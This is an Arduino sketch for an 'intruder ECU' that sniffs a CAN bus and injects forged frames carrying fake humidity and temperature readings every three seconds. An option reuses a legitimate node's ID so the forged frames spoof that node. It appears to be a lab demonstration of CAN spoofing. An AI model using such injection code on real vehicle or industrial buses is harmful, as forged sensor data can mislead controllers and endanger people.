/**************************************************************************************
 * INCLUDES
 **************************************************************************************/
#include <Arduino_CAN.h>

/**************************************************************************************
 * CONSTANTS
 **************************************************************************************/
// const uint32_t CAN_ID = 0x100; // Define with same CAN ID for spoof
const uint32_t CAN_ID = 0x200; // Define with diff CAN ID 


/**************************************************************************************
 * SETUP/LOOP
 **************************************************************************************/
void setup() {
  Serial.begin(115200);
  while (!Serial) {}

  if (!CAN.begin(CanBitRate::BR_250k)) {
    Serial.println("Failed to initialize CAN!");
    while (1);
  }

  Serial.println("Intruder ECU setup complete.");
}

void loop() {
  // Read from the CAN bus
  if (CAN.available()) {
    CanMsg msg = CAN.read();

    // Print received message details
    Serial.print("Received CAN message. ID: 0x");
    Serial.print(msg.id, HEX);
    Serial.print(", Length: ");
    Serial.print(msg.data_length);
    Serial.print(", Data: ");
    for (int i = 0; i < msg.data_length; i++) {
      Serial.print(msg.data[i], HEX);
      Serial.print(" ");
    }
    Serial.println();
  }

  // Constructed spoofed CAN message
  float fakeHumidity = 65.5;  // fake humidity
  float fakeTemperature = 30.3;  // fake temperature

  uint8_t msg_data[8];
  memcpy(&msg_data[0], &fakeHumidity, sizeof(fakeHumidity));  // Copy fake humidity
  memcpy(&msg_data[4], &fakeTemperature, sizeof(fakeTemperature));  // Copy fake temperature

  // Create a CAN message with the spoofed data
  CanMsg const spoofedMsg(CanStandardId(CAN_ID), sizeof(msg_data), msg_data);

  // Send the spoofed CAN message
  if (int const rc = CAN.write(spoofedMsg); rc < 0) {
    Serial.print("Failed to send spoofed CAN message. Error code: ");
    Serial.println(rc);
  } else {
    Serial.print("Sent spoofed CAN message. Humidity: ");
    Serial.print(fakeHumidity);
    Serial.print(" %, Temperature: ");
    Serial.print(fakeTemperature);
    Serial.println(" °C");
  }

  delay(3000); // Wait 3 seconds before sending the next message
}
